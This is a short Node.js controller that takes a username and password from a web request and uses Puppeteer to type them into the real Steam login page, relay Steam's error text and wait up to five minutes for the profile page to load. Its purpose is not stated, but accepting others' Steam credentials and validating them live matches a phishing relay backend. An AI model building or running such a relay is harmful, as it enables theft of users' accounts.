const puppeteer = require('puppeteer');

class Login{
    async login(req,res){     
      try {
        const { username, password } = req.body;
        const browser = await puppeteer.launch({
            headless: false,
            args: ['--no-sandbox', '--disable-setuid-sandbox','--window-size=1920,1080'],
            defaultViewport:null
        });

        const page = await browser.newPage();

        await page.goto('https://steamcommunity.com/login/home/?goto=id%2F456721398%2F', { waitUntil: 'networkidle2' });

        await page.waitForSelector('input._2GBWeup5cttgbTw8FM3tfx');

        await page.type('input._2GBWeup5cttgbTw8FM3tfx', username);
        await page.type('input[type="password"]', password);

        await page.click('button.DjSvCZoKKfoNSmarsEcTS');

        const errorSelector = 'div._1W_6HXiG4JJ0By1qN_0fGZ';
        const isErrorElementGone = await page
            .waitForSelector(errorSelector, { hidden: true, timeout: 1000 })
            .then(() => true)
            .catch(() => false);

        if (!isErrorElementGone) {
            const errorMessage = await page.$eval(errorSelector, el => el.textContent.trim()).catch(() => 'Неизвестная ошибка');
            await browser.close();
            return res.status(200).json({ error: errorMessage });
        }

        
        await page.waitForSelector('div.profile_rightcol', { timeout: 300000});

        return res.json({ success: true, message: 'Login successful!'});

    } catch (error) {
        console.error('Error in Puppeteer:', error);
        return res.status(500).json({ error: 'An unexpected error occurred' });
    }
    }
 
    
}
module.exports = new Login()